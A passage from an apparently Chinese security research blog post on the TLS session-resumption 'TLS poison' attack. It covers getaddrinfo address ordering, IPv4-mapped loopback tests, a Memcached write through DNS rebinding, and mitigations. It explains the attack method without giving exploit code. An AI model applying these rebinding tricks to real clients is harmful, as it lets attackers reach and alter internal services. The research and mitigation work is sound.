，表示保持原顺序，体现为随机。</p></li></ul><p><strong>再次重申，这里的 IPv6 指的是IPv4-mapped IPv6 addresses 这类地址</strong></p><p>对于 IPv6 我们可以使用如下形式在 gdb 打印对应的地址：</p><p></p><figure class="highlight xl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-title">p</span> ((struct sockaddr_in6*)((*a1-&gt;</span><span class="hljs-function"><span class="hljs-title">dest_addr</span>)-&gt;</span><span class="hljs-function"><span class="hljs-title">ai_addr</span>))-&gt;</span><span class="hljs-function"><span class="hljs-title">sin6_addr</span>-&gt;</span>__<span class="hljs-function"><span class="hljs-title">in6_u</span>-&gt;</span>__u6_addr8</span><br></pre></td></tr></tbody></table></figure><p></p><p>于是我接下来依次对 IPv4 与 IPv6 当中各种排列组合进行了测试：</p><ul><li>IPv6 vps vs IPv4 vps。并不适用任何判断，函数执行完成返回 -1 ，表示保持原顺序，体现为随机。</li><li>IPv6 vps vs 127.0.0.1。适用于 scope 判断，127 优先</li><li>::1 vs 45.76.196.189。适用于 prec 判断，::1 优先</li><li>::1 vs 127.0.0.1。适用于 prec 判断，::1 优先</li><li>127.0.0.1 vs :: 。适用于 scope 判断， :: 优先</li><li>0.0.0.0 vs IPv6 vps。适用于 scope 判断， IPv6 VPS 优先。</li><li>0.0.0.0 vs  ::1。适用于 scope 判断，::1 优先</li><li>IPv4 vps vs ::。适用于 scope 判断，IPv4 vps 优先</li><li>IPv4 vps vs ::1。适用于 price 判断， ::1 优先</li></ul><p>总结起来我们可以得到以下这个表格：</p><table><thead><tr><th>对比形式</th><th>A1</th><th>A2</th><th>优先值</th></tr></thead><tbody><tr><td>v4127-v40</td><td>127.0.0.1</td><td>0.0.0.0</td><td>A1</td></tr><tr><td>v4vps-v40</td><td>vps</td><td>0.0.0.0</td><td>A1</td></tr><tr><td>v4vps-v4127</td><td>127.0.0.1</td><td>vps</td><td>A1</td></tr><tr><td>v4vps-v4vps</td><td>vps</td><td>vps</td><td>随机，保持原顺序</td></tr><tr><td>v4vps-v6vps</td><td>vps</td><td>vps</td><td>随机，保持原顺序</td></tr><tr><td>v4127-v6vps</td><td>127.0.0.1</td><td>vps</td><td>A1</td></tr><tr><td>v4127-v60</td><td>127.0.0.1</td><td>::</td><td>A1</td></tr><tr><td>v4127-v6127</td><td>127.0.0.1</td><td>::1</td><td>A2</td></tr><tr><td>v40-v6vps</td><td>0.0.0.0</td><td>vps</td><td>A2</td></tr><tr><td>v40-v6127</td><td>0.0.0.0</td><td>::1</td><td>A2</td></tr><tr><td>v4vps-v6127</td><td>vps</td><td>::1</td><td>A2</td></tr><tr><td>v4vps-v60</td><td>vps</td><td>::</td><td>A1</td></tr><tr><td>V4127map-v4ps</td><td>vps</td><td>::ffff:7f00:0001</td><td>随机，保持原顺序</td></tr></tbody></table><p>整体来说，我们可以大致从表中看出，含有双 A 记录的情况，如果出现 127.0.0.1 或者 ::1 ，都会以这两者优先，而两者中又会以 ::1 优先，所以对于前文的 IP 选择排序问题我们这里也就得到了一个大体的答案。</p><blockquote class="colorquote success"><p>2021/05/14 更新：</p><p>增加了 127.0.0.1 使用 IPv4-mapped 表示 IPv6 时，与 v4 vps 地址的对比，详细说明见 <a href="#IPv4-Mapped-127-0-0-1">Additional Remarks</a></p></blockquote><h3 id="IP-Sort-IN-Chromium"><a href="#IP-Sort-IN-Chromium" class="headerlink" title="IP Sort IN Chromium"></a>IP Sort IN Chromium</h3><p>当然在 Chromium 中，我们也可以看到相应的 IP 选择实现方式：</p><p><a href="https://source.chromium.org/chromium/chromium/src/+/master:net/dns/address_sorter_posix.cc;l=39" target="_blank" rel="noopener">https://source.chromium.org/chromium/chromium/src/+/master:net/dns/address_sorter_posix.cc;l=39</a></p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// Address sorting is performed according to RFC3484 with revisions.</span></span><br><span class="line"><span class="hljs-comment">// http://tools.ietf.org/html/draft-ietf-6man-rfc3484bis-06</span></span><br><span class="line"><span class="hljs-comment">// Precedence and label are separate to support override through /etc/gai.conf.</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Returns true if |p1| should precede |p2| in the table.</span></span><br><span class="line"><span class="hljs-comment">// Sorts table by decreasing prefix size to allow longest prefix matching.</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ComparePolicy</span><span class="hljs-params">(<span class="hljs-keyword">const</span> AddressSorterPosix::PolicyEntry&amp; p1,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">                   <span class="hljs-keyword">const</span> AddressSorterPosix::PolicyEntry&amp; p2)</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> p1.prefix_length &gt; p2.prefix_length;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>在 <a href="https://source.chromium.org/chromium/chromium/src/+/master:net/dns/address_sorter_posix.cc;l=200" target="_blank" rel="noopener">https://source.chromium.org/chromium/chromium/src/+/master:net/dns/address_sorter_posix.cc;l=200</a> 也实现了基于 RFC 3484 对应的 IP 排序方法。</p><p>但是实际测试中， chrome 有个非常奇特的现象，就是对于返回多个 IP ，chrome 会立马挨个对其发起请求，我找了一些朋友询问了相关情况，有些表示没有关注过，有位朋友则表示他过去发现过这个情况，说是 chrome 有个 IP 选优的情况，会对多个 IP 进行测速，以最快的结果作为最佳选择。关于这个结论我在 chromium.org 等相关文档进行了查找，但是并没有找到关于该现象的说明。如果有朋友知道该现象的原因或者相关信息的话，也欢迎提出评论。</p><h3 id="Something-else"><a href="#Something-else" class="headerlink" title="Something else"></a>Something else</h3><h4 id="Bad-behaved-Application"><a href="#Bad-behaved-Application" class="headerlink" title="Bad-behaved Application"></a>Bad-behaved Application</h4><p>在 RFC 6724 当中，有着这么一段话</p><blockquote><p>​    Well-behaved applications SHOULD NOT simply use the first address returned from an API such as getaddrinfo() and then give up if it fails. For many applications, it is appropriate to iterate through the list of addresses returned from getaddrinfo() until a working address is found. For other applications, it might be appropriate to try multiple addresses in parallel (e.g., with some small delay in between) and use the first one to succeed. </p></blockquote><p>也就是说应用程序不应该简单地使用从 API（如<code>getaddrinfo</code>）返回的第一个地址，失败了就放弃改地址。对于许多应用程序来说，它们都选择从<code>getaddrinfo</code>返回的地址列表中进行挨个测试，直到找到一个正常的地址。对于其他应用程序，可能适合并行尝试多个地址（例如，中间有一些小的延迟），并使用第一个地址成功。(可能 Chrome 就是基于这个表现)</p><p>然而 curl 就是这么一个 Bad-behaved Application ，从<code>getaddrinfo</code>函数中取得的地址链表，依次挨个建立连接，一个不行就换下一个直到成功或链表为空为止。</p><h4 id="Some-History-of-getaddrinfo"><a href="#Some-History-of-getaddrinfo" class="headerlink" title="Some History of getaddrinfo"></a>Some History of getaddrinfo</h4><p>一段关于 getaddrinfo 排序有趣的历史，以下是个人对其抽取的理解，原文见：<a href="https://lists.debian.org/debian-glibc/2007/09/msg00347.html" target="_blank" rel="noopener">glibc’s getaddrinfo() sort order</a></p><p>在过去，主机名到 IP 地址的查询到一般都是用<code>gethostbyname</code>来完成的，<code>gethostbyname</code>的地址是按照服务器返回的地址顺序排列的（除非在本地做了特殊的配置）。当一个查询有多个地址时，基本上所有 NS 服务器都会安排对返回的地址进行”轮流 “或 “循环”：每个查询都会得到一个新的排序。这是为了让一个服务名可以引用多个物理网络接口（或许在不同的主机上），并在这些接口上分担负载，这就是所谓的 “基于DNS的负载均衡”。如果协议是像邮件这样的协议，如果第一个地址不成功，发送者可能会尝试多个地址，这也给了你一个故障转移(failover)。</p><p> gethostbyname 理论上可以支持 IPv6 ，但每次调用只能返回一种地址类型。虽然有一种方法可以将 IPv4 地址嵌入到 IPv6 地址中，但对于这样的情况，没有明确的方法告诉 gethostbyname ，调用的应用程序（以及应用程序所依赖的其他堆栈）将应对得到一堆 AF_INET6 而不是 AF_INET 的返回。因此对于 IPv6 ，需要一个新的接口。这个接口（在 RFC3493 s6.1和它的前身中定义）就是 getaddrinfo 。</p><p>它有几个新特性，其中大部分与这里无关。关键的新功能是：getaddrinfo 允许应用程序指定它是否只想获得 IPv4 地址，还是也想获得 IPv6 地址，如果获得混合的地址，那么是将其编码为 AF_INET ，还是将其编码为 “v6-mapped “AF_INET6（这里就是 IPv4-mapped IPv6 Addresses ）。结合其他各种新的特点，这使得将一个仅有 IPv4 的应用程序转换为 IPv6 功能变得相当简单。所以，总的来说：getaddrinfo 是用来取代 gethostbyname 的。</p><p>然而，另外，人们意识到，如果 getaddrinfo 可以返回 IPv4 和 v6 地址的混合物，那么有必要指定它们的返回顺序。当 RFC3484 编写时，作者显然认为最好的方法是在所有地址上定义一个比较函数，它将定义哪个地址是首选。 RFC3484 的作者不管上面所描述的对 DNS 循环功能的影响，指定（第6条规则9）所有地址应该按照与做出选择的主机的 “接近度 “进行排序–其中 “接近度 “被定义为普通初始地址前缀的长度。</p><p>这在 3484 制定之时，对于 IPv6 的真实网络近似性可能是一个有争议的定义，但现在很明显，在真实的IPv6互联网中，它不是这样的衡量标准，在IPv4互联网中也从来没有这样的衡量标准。所以 RFC3484 s6 规则 9 就是错误的，因为它背后的原因即使曾经适用现在也不再适用了。然而，比这更糟糕的是：规则 9。试图改变现有系统的行为。如果我们同意规则 9，那么它也应该同样适用于使用 gethostbyname。的应用程序。所有使用 gethostbyname 的现有应用程序都不符合规则9。也许可以修改 gethostbyname，使其根据 RFC3484 s5 和 s6 对地址进行排序。但这是一个好主意吗？不，显然不是。这将改变所有目前使用 gethostbyname 的应用程序的行为。目前，这些应用程序 “随机 “地选择地址（根据 DNS 循环）。规则 9 会让应用程序根据最长通用前缀来选择地址，这将破坏基于 DNS 的负载均衡机制。那么 getaddrinfo 呢？ 我们没有理由为了增加新功能彻底地改变该 API 。事实上，我们看到，我们自己服务器的 DNS 负载均衡已经被这个变化打破了! 也就是说，应用程序从使用非规则 9 的 gethostbyname 改为规则 9 的 getaddrinfo ，服务器会出现比较严重的非负载均衡。</p><p>RFC 试图规定以可预测的顺序返回地址是不合理的，因为几十年来整个互联网所依赖的既定行为是地址不是以可预测的顺序返回的，并且这里的不可预测性不是偶然的。在 DNS 轮询出现之前，地址总是按照 DNS 区域管理员指定的顺序返回，特殊的代码被添加到 namervers 中 (几十年前)，以 “随机化 “这个顺序。 getaddrinfo 不应该取消这个措施。正如上面所展示的，RFC是错误的，与现有的实践不一致，而且所提出的遵守它的方式导致我们有两个类似的接口（ gethostbyname 和 getaddrinfo ），它们的行为不一致，定义 getaddrinfo 的文档是 RFC 3493，而 RFC 3493 没有参考 RFC 3484 ，它根本没有提到排序。请注意，RFC3484 不是一个标准。它是一个 “proposed standard”–最早的 IETF 标准跟踪文件状态的东西。当然，我们应该建议 RFC3484 规则 9 应被废弃，并应被废除（IPv4 应该要废除这个规则，IPv6 可能也需要）。</p><h2 id="Additional-Remarks"><a href="#Additional-Remarks" class="headerlink" title="Additional Remarks"></a>Additional Remarks</h2><h3 id="IPv4-Mapped-127-0-0-1"><a href="#IPv4-Mapped-127-0-0-1" class="headerlink" title="IPv4-Mapped 127.0.0.1"></a>IPv4-Mapped 127.0.0.1</h3><p>2021/05/14 更新：</p><p>对于 IPv4-mapped IPv6 这类地址，我认为并不是真正意义上的 v6 地址，真正 v6 的 loopback 地址为 ::1 ，IPv4-mapped IPv6 只是 IPv4 地址写成 IPv6 形式。那么既然并不是真正的 IPv6 ，但是写作了 IPv6 ，我觉得对于<code>getaddrinfo</code>来说，他确实是 IPv6 的结构，但是对于 IPv6 来说，真正的回环地址并不是这个，所以他可能被视为普通的 IPv6 地址处理。</p><p>我们可以简单验证一下自己的想法：直接在一个域名上同时设置 AAAA 记录为 ::ffff:7f00:0001 ，A 记录为随意一个 IPv4 公网地址。</p><p>使用 curl 请求我们设置的域名，得到的结果如下图所示：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/11.png" alt=""></p><p>可以看到，这两个地址是随机返回的。</p><p>并且我们也可以重新 debug 一遍 getaddrinfo 函数，验证一下自己的想法。于是，重新 debug 了一遍 libc 当中的 rfc3484_sort 函数，对于 ::ffff:7f00:0001 地址来说， getaddrinfo 使用了 IPv6 结构体处理这个地址，但是最后结果是按照 DNS 得到的原顺序返回，也就是说，这个地址与 IPv4 vps 地址一起出现时，对于getaddrinfo 来说是随机返回。所以从结果来看，他确实被视为了跟 v4 vps 相同优先级的地址。</p><p>但是我们实际上应不应该这么处理呢？按照 RFC 6742 的说法：</p><blockquote><p>​    IPv4-compatible addresses [RFC4291], IPv4-mapped [RFC4291], IPv4-converted [RFC6145], IPv4-translatable [RFC6145], and 6to4 addresses [RFC3056] contain an embedded IPv4 address. For the purposes of this document, these addresses MUST be treated as having global scope.</p></blockquote><p>IPv4-mapped 这类地址应该被视为拥有 global scope ，而真正意义上的回环地址应该是被作为 link-local scope 处理的，这也就基本能解释为什么他会被作为与 v4 vps 这类地址一样的优先级了。</p><p>所以之前文中的说法不应该把 ::ffff:7f00:0001 与 127.0.0.1 视为同类地址，这一点是错误的。</p><h3 id="IPv4-Mapped-With-Memcached"><a href="#IPv4-Mapped-With-Memcached" class="headerlink" title="IPv4-Mapped With Memcached"></a>IPv4-Mapped With Memcached</h3><p>2021/05/14 更新：</p><p>我们可以尝试一下使用 IPv4-Mapped 这类地址进行实验看看能不能写入 Memcached，同样的 DNS 配置：在一个域名上同时设置 AAAA 记录为 ::ffff:7f00:0001 ，A 记录为随意一个 IPv4 公网地址。</p><p>然后其他操作基本同双 A 记录实验方式一致，使用 proxy.py 拒绝客户端对 TLS 服务端的第二次请求以达到 DNS Rebinding 的效果，于是得到的实验结果如下图所示：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/12.png" alt=""></p><p>说明 Memcached 可以从 IPv4-Mapped 这类地址写入。</p><h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>纵观整个漏洞，我觉得其实造成这个漏洞是由于比较多复杂的因素导致的，从协议角度来说，在 RFC 当中也并没有提到 Client 到底应该怎么存储 Server 给予的相关凭证，也并没有说明清楚怎么与对应的 TLS 会话绑定，所以导致了 Client 在支持 TLS 会话重用的产生了各种实现；而从 Client 客户端漏洞来说，也是开发者们没有对进行 TLS 会话重用的地址进行二次校验，导致了可以使用 DNS Rebinding 来轻松绕过。</p><p>所以，对于该类漏洞首要的防护手段就是需要确认进行 TLS 会话重用的地址与之前的地址一致，而这个实现途径有很多种方式，比如说防御 DNS Rebinding 的方式能在一定程度上缓解到整个漏洞利用，但是对于 DNS Rebinding 的传统防守方式有些小伙伴可能会说 Client 只做一次 DNS 解析，之后就一直使用这个 IP 解析结果，但是如果 Client 存在像文中那样的挨个尝试建立连接后使用第一个连接成功的 IP 的现象的话，我们就可以使用上文提到的双 A 记录的方式来绕过该类限制。</p><p>那怎么做才是最好呢？作者在防御章节做出了自己阐述：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part3/3.jpg" alt=""></p><p>作者建议将 (hostname, port, ip_addr) 作为缓存键值对进行绑定，但是我个人认为这并不是一个良好的缓解措施，因为在当今 CDN 大流行的情况下，很难说这个域名会一直使用到同一个 IP ，如果将域名、端口、IP 三者绑定的话，对于 CDN 之类的服务会话重用机制消耗将会大大提升。</p><p>所以我觉得更好的做法应该是正如 Wiki 上介绍的，使用 IP 与对应的端口进行绑定 ：</p><blockquote><p>​    The client associates this <em>session id</em> with the server’s IP address and TCP port, so that when the client connects again to that server, it can use the <em>session id</em> to shortcut the handshake.</p></blockquote><p>使用 IP 与对应的端口作为缓存键值对进行绑定，这样的话就不会对 CND 之类的服务造成太大影响，而且也降低了被攻击的风险，就不会将重用会话发送到其他 IP 上了。当然这里也只是我个人片面的想法，可能还有很多这么做会受到影响的地方，比如说可能 Server 对于 Host 域名有校验而拒绝重用会话等等。所以，这里可能并没有一个十全十美的缓解该攻击方式的问题等等。</p><p>当然你也可以选择直接禁用掉 TLS 会话重用的功能，有些 Client 上就提供了 Disable outbound TLS session resumption 的设置（除了 chrome 等其他一些） ：</p><ul><li>libcurl: CURLOPT_SSL_SESSIONID_CACHE=false</li><li>firefox: security.ssl.disable_session_identifiers=true</li><li>Tor browser: disabled by default </li><li>Java, Nodejs, Chrome, others: no option</li></ul><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>整个漏洞弄下来还是非常有意思的，尽管其利用条件比较苛刻，需要有一个可以被攻击的服务 + Client 需要支持 TLS Session Resumption + DNS Rebinding（万一只查询一次 DNS 就没了），在当今全是从数学算法角度去 Hack TLS 的情况下，作者能从一个比较 Web 的角度来 Hack TLS ，我觉得是一个非常独到的视角，是非常值得学习的地方，尤其是这种协议设计的问题上。</p><p>还有，我觉得作者的标题也取的很棒，《When TLS Hacks You》，我们可以想一下为什么不是《When HTTPS Hacks You》呢？卖个关子，如果还有后续的进展，我也会同步到自己的个人博客上，欢迎关注，以及前来交流：<a href="https://blog.zeddyu.info/">https://blog.zeddyu.info/</a></p><p>以上就是本篇文章的全部内容了，如果对该篇文章有任何疑问或者质疑，欢迎来信：echo 